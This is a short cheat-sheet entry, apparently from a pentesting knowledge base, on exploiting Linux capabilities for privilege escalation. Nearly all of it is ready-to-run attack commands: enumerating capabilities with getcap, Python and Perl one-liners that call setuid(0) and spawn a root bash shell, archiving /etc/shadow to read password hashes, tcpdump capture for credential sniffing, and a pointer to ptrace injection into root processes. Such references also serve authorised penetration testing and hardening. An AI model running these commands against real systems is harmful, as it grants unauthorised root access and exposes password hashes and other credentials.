---
description: |
  Exploit Linux capabilities for privilege escalation.
  Capabilities grant specific root privileges to binaries.
command: |
  # Find binaries with capabilities
  getcap -r / 2>/dev/null

  # cap_setuid — Python
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

  # cap_setuid — Perl
  /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

  # cap_dac_read_search — read any file
  /usr/bin/tar czf /tmp/shadow.tar.gz /etc/shadow
  tar xzf /tmp/shadow.tar.gz

  # cap_net_raw — packet capture (credential sniffing)
  tcpdump -i any -w /tmp/capture.pcap

  # cap_sys_ptrace — process injection
  # Inject into root process
phase:
  - PrivEsc
target_os:
  - Linux
services: []
items:
  - Shell
techniques:
  - Linux_Misconfig
network_position:
  - Local
references:
  - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
---
